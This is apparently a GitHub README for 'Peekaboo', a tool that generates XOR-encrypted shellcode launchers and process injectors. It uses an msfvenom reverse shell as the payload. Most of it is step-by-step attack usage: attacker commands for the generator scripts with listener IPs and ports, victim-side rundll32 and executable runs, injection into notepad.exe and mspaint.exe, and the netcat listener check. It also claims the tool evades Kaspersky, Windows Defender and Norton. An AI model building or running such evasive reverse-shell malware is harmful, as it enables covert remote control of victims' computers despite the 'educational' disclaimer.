# Peekaboo

Simple undetectable shellcode and code injector launcher example. Inspired by RTO malware development course.

## Main logic

XOR encryption and decryption for functions call and main payload - `msfvenom` reverse shell as example.

## Usage
## 1. DLL
### on attacker machine

check your IP:
```bash
ip a
```

![attacker machine IP](./screenshots/1.png?raw=true)

run python script with flags:
```bash
python3 peekaboo.py -l 192.168.1.64 -p 4444
```

![run python script](./screenshots/2.png?raw=true)

### then on victim machine (windows 10 x64):
run on powershell or cmd promt:
```cmd
rundll32 .\peekaboo.dll, fcPxxUxbQWtknoIZQxehCd
```

![run on victim machine](./screenshots/3.png?raw=true)

### check on attacker machine:
check your netcat listener:

![check netcat listener](./screenshots/4.png?raw=true)

example:
![final](./screenshots/5.png?raw=true)

## 2.Injector
### on attacker machine:
check attacker ip:
```bash
ip a
```

![check IP](./screenshots/6.png?raw=true)

run python script on linux (for example process `notepad.exe`):
```bash
python3 peekaboo-inj.py -l 10.9.1.6 -p 4444 -e notepad.exe
```

![encrypting](./screenshots/7.png?raw=true)

compile in VS - windows machine x64:
```cmd
.\compile-inj.bat
```

![compile in attacker windows x64](./screenshots/8.png?raw=true)

### then on victim machine (windows x64):
```cmd
.\peekaboo.exe
```

or click

![run on victim machine](./screenshots/9.png?raw=true)

### check on attacker machine:
check your netcat listener:

![check netcat listener](./screenshots/10.png?raw=true)

## 3. UPDATE: Compile injector on kali linux
run python script on linux (for example process `notepad.exe`):
```bash
python3 peekaboo-inj.py -l 10.10.88.57 -p 4444 -e notepad.exe
```

![encrypting and compile](./screenshots/12.png?raw=true)

### then on victim machine (windows 10 x64):
```cmd
.\peekaboo.exe
```

### check on attacker machine:
check your netcat listener:

![check netcat listener](./screenshots/13.png?raw=true)

## 4. NT API injector
run python script on linux (for example process `mspaint.exe`):
```bash
python3 peekaboo_nt.py -l 192.168.57.100 -p 4445 -e mspaint.exe -m console
```

![enc and compile nt](./screenshots/15.png?raw=true)

### then on victim machine (windows 10 x64):
```cmd
.\peekaboo.exe
```

![run malware](./screenshots/14.png?raw=true)

## Issues.
Tested on:
1. Attacker machines: Kali linux 2020.1, Windows 10 x64
2. Victim machine: Windows 7 x64, Windows 10 x64
3. Payload: windows x64 reverse shell from msfvenom
4. AV Engines: Kaspersky, Windows Defender, Norton Antivirus Plus

# Virus Total result:
02 september 2021

![virustotal](./screenshots/11.png?raw=true)

[https://www.virustotal.com/gui/file/c930b9aeab693d36c68e7bcf6353c7515b8fffc8f9a9233e49e90da49ab5d470/detection](https://www.virustotal.com/gui/file/c930b9aeab693d36c68e7bcf6353c7515b8fffc8f9a9233e49e90da49ab5d470/detection)

## TODO
- [x] Compile injector in Kali linux
- [x] XOR + AES [aes branch](https://github.com/cocomelonc/peekaboo/tree/aes)
- [ ] Implement custom variations of `GetProcAddress` and `GetModuleHandle` functions
- [ ] Replace msfvenom shell to custom undetectable

## Attention
This tool is a Proof of Concept and is for Educational Purposes Only!!! Author takes no responsibility of any damage you cause

## License
[MIT](https://choosealicense.com/licenses/mit/)
